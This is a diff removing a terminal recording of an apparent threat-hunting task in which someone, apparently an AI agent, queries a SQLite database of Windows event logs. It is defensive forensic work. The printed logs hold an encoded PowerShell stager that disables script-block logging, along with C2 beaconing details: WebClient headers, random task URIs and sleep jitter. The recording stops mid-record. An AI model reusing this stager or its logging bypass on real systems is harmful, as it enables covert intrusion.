@@ -1,2817 +1,0 @@
-[?2004hroot@330dbb2b3463:~# asciinema rec --stdin /logs/agent/recording.cast
-[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
-[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
-[?2004hroot@330dbb2b3463:~# clear
-[?2004l[H[J[3J[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db ".schema events"
-[?2004lCREATE TABLE events (event_id TEXT, timestamp TEXT, event_code INTEGER, channel TEXT, provider TEXT, host TEXT, user TEXT, target_user TEXT, image TEXT, parent_image TEXT, command_line TEXT, logon_type TEXT, service_name TEXT, service_file_name TEXT, target_image TEXT, target_object TEXT, details TEXT, granted_access TEXT, src_ip TEXT, dst_ip TEXT, dst_port TEXT, process_guid TEXT, message TEXT);
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT event_code, COUNT(*) FROM events GROUP BY event_code ORDER BY 2 DESC;"
-[?2004l5156|197
-800|73
-4658|69
-4103|62
-3|46
-5158|35
-4690|32
-4656|32
-10|30
-12|19
-13|13
-7|10
-4634|5
-5145|4
-4661|4
-4627|4
-4624|4
-18|4
-4689|3
-5|3
-11|2
-9|2
-5140|1
-4703|1
-4672|1
-4663|1
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT DISTINCT host FROM events;"
-[?2004lDC01.corp.example
-WS-05.corp.example
-WS-06.corp.example
-[?2004hroot@330dbb2b3463:~# sqlite3 /root/data/eventlogs.db "SELECT event_id, event_code, host, user, image, parent_image, command_line, details FROM events WHERE event_code IN (11, 12, 13, 18, 4103, 800) LIMIT 50;"
-[?2004levt-00019|800|WS-05.corp.example|||||
-evt-00020|800|WS-05.corp.example|||||
-evt-00021|4103|WS-05.corp.example|||||
-evt-00022|4103|WS-05.corp.example|||||
-evt-00023|800|WS-05.corp.example|||||
-evt-00024|800|WS-05.corp.example|||||
-evt-00025|4103|WS-05.corp.example|||||
-evt-00026|800|WS-05.corp.example|||||
-evt-00027|800|WS-05.corp.example|||||
-evt-00031|4103|WS-05.corp.example|||||
-evt-00033|4103|WS-05.corp.example|||||
-evt-00034|12|WS-05.corp.example||C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|||
-evt-00074|18|DC01.corp.example||System|||
-evt-00075|18|DC01.corp.example||System|||
-evt-00076|18|DC01.corp.example||System|||
-evt-00077|18|DC01.corp.example||System|||
-evt-00099|800|WS-05.corp.example|||||
-evt-00100|800|WS-05.corp.example|||||
-evt-00101|4103|WS-05.corp.example|||||
-evt-00103|4103|WS-05.corp.example|||||
-evt-00105|800|WS-05.corp.example|||||
-evt-00108|800|WS-05.corp.example|||||
-evt-00109|4103|WS-05.corp.example|||||
-evt-00110|12|WS-05.corp.example||C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|||
-evt-00111|800|WS-05.corp.example|||||
-evt-00112|800|WS-05.corp.example|||||
-evt-00113|4103|WS-05.corp.example|||||
-evt-00114|4103|WS-05.corp.example|||||
-evt-00117|12|DC01.corp.example||C:\windows\system32\svchost.exe|||
-evt-00133|13|DC01.corp.example||C:\windows\system32\svchost.exe|||QWORD (0x01d65fdf-0x36966894)
-evt-00180|800|WS-05.corp.example|||||
-evt-00181|800|WS-05.corp.example|||||
-evt-00182|4103|WS-05.corp.example|||||
-evt-00183|4103|WS-05.corp.example|||||
-evt-00184|800|WS-05.corp.example|||||
-evt-00185|800|WS-05.corp.example|||||
-evt-00186|4103|WS-05.corp.example|||||
-evt-00187|800|WS-05.corp.example|||||
-evt-00188|800|WS-05.corp.example|||||
-evt-00189|13|WS-05.corp.example||C:\windows\system32\svchost.exe|||QWORD (0x01d65fdf-0x38b2b2dc)
-evt-00190|12|WS-05.corp.example||C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe|||
-evt-00192|4103|WS-05.corp.example|||||
-evt-00194|4103|WS-05.corp.example|||||
-evt-00223|12|WS-05.corp.example||C:\windows\System32\svchost.exe|||
-evt-00224|12|WS-06.corp.example||C:\windows\System32\svchost.exe|||
-evt-00225|13|WS-05.corp.example||C:\windows\System32\svchost.exe|||QWORD (0x01d65fdf-0x39716c65)
-evt-00226|13|WS-06.corp.example||C:\windows\System32\svchost.exe|||QWORD (0x01d65fdf-0x39703e82)
-evt-00227|13|WS-06.corp.example||C:\windows\system32\svchost.exe|||QWORD (0x01d65fdf-0x397e6787)
-evt-00238|800|WS-05.corp.example|||||
-evt-00239|800|WS-05.corp.example|||||
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/hunt.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> import json
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's inspect some event_code 4103 and 800 messages to see if there is any suspicious PowerShell
-[?2004l[?2004h> cursor.execute("SELECT event_id, event_code, host, message FROM events WHERE event_code IN (4103, 800) AND message IS NOT NULL AND message != ''")
-[?2004l[?2004h> rows = cursor.fetchall()
-[?2004l[?2004h> print(f"Found {len(rows)} PowerShell events with messages.")
-[?2004l[?2004h> for r in rows[:20]:
-[?2004l[?2004h>     print("="*50)
-[?2004l[?2004h>     print(f"Event ID: {r[0]} | Code: {r[1]} | Host: {r[2]}")
-[?2004l[?2004h>     print(r[3][:1000])
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/hunt.py
-[?2004lFound 135 PowerShell events with messages.
-==================================================
-Event ID: evt-00019 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11254
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBj
-==================================================
-Event ID: evt-00020 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:         $IV=[BitConverter]::GetBytes($(Get-Random));
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11256
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBb
-==================================================
-Event ID: evt-00021 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(Start-Sleep): "Start-Sleep"
-ParameterBinding(Start-Sleep): name="Seconds"; value="5"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQ
-==================================================
-Event ID: evt-00022 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(Get-Random): "Get-Random"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOAB
-==================================================
-Event ID: evt-00023 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:             0..255 | ForEach-Object {
-. 
-
-Context Information: 
-	DetailSequence=2
-	DetailTotal=2
-
-	SequenceNumber=11258
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQB
-==================================================
-Event ID: evt-00024 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:                                 $a9486 = New-Object System.Net.WebClient
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11260
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYA
-==================================================
-Event ID: evt-00025 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(New-Object): "New-Object"
-ParameterBinding(New-Object): name="TypeName"; value="System.Net.WebClient"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbAC
-==================================================
-Event ID: evt-00026 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:                                 $script:Headers.GetEnumerator() | % {$a9486.Headers.Add($_.Name, $_.Value)}
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11262
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhA
-==================================================
-Event ID: evt-00027 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:                                 $taskURI = $script:TaskURIs | Get-Random
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11264
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYA
-==================================================
-Event ID: evt-00031 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(ForEach-Object): "ForEach-Object"
-ParameterBinding(ForEach-Object): name="Process"; value="$a9486.Headers.Add($_.Name, $_.Value)"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOw
-==================================================
-Event ID: evt-00033 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(Get-Random): "Get-Random"
-ParameterBinding(Get-Random): name="InputObject"; value="/admin/get.php"
-ParameterBinding(Get-Random): name="InputObject"; value="/news.php"
-ParameterBinding(Get-Random): name="InputObject"; value="/login/process.php"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjAC
-==================================================
-Event ID: evt-00099 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11266
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBj
-==================================================
-Event ID: evt-00100 | Code: 800 | Host: WS-05.corp.example
-Pipeline execution details for command line:         $IV=[BitConverter]::GetBytes($(Get-Random));
-. 
-
-Context Information: 
-	DetailSequence=1
-	DetailTotal=1
-
-	SequenceNumber=11268
-
-	UserId=CORP\pgustavo
-	HostName=ConsoleHost
-	HostVersion=5.1.18362.752
-	HostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBb
-==================================================
-Event ID: evt-00101 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(Start-Sleep): "Start-Sleep"
-ParameterBinding(Start-Sleep): name="Seconds"; value="5"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQ
-==================================================
-Event ID: evt-00103 | Code: 4103 | Host: WS-05.corp.example
-CommandInvocation(Get-Random): "Get-Random"
-
-
-Context:
-        Severity = Informational
-        Host Name = ConsoleHost
-        Host Version = 5.1.18362.752
-        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223
-        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOAB
-==================================================
-Event ID: evt-00105 | Code: 800 | Host: WS-05.corp.example
